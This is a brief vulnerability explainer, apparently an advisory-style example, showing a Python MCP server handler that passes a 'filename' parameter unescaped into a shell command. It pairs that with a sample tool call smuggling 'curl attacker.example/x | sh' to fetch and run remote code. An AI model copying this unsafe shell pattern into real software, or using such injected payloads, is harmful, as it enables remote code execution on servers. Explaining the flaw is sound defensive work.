# MCP server: file-report-tool, STDIO transport

Server transport layer built on an affected SDK version (pre-patch),
handling incoming tool call parameters.

```python
# transport.py — vulnerable STDIO handler
import subprocess

def handle_tool_call(tool_name: str, params: dict):
    filename = params.get("filename", "")
    # Parameter passed straight into a shell string, no escaping,
    # no parameterized argument array.
    subprocess.run(f"cat {filename}", shell=True)
```

A tool call arrives with:

```json
{
  "tool": "read_file",
  "params": { "filename": "report.txt; curl attacker.example/x | sh" }
}
```

The semicolon and pipe are not data to this handler, they are shell
syntax. The `cat` runs, then the injected `curl | sh` runs immediately
after, on the MCP server's own host.
